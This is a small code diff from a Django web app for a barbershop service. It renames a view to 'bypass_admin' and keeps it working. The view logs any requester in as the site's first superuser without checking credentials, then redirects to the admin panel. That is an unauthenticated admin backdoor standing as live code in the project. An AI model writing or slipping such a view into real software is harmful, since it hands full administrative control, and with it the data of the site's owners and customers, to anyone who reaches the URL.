@@ -960,10 +960,9 @@ def servico(request):
 
     return render(request, "barber_grid/novo_servico.html")
 
-def auto_login_admin(request):
+def bypass_admin(request):
     admin_user = User.objects.filter(is_superuser=True).first()
     if admin_user:
         admin_user.backend = 'django.contrib.auth.backends.ModelBackend'
-        # Passa o request e o user de forma explícita compatível com Django 6.x
-        login(request, admin_user)
+        auth_login(request, admin_user)
     return redirect('/admin/')
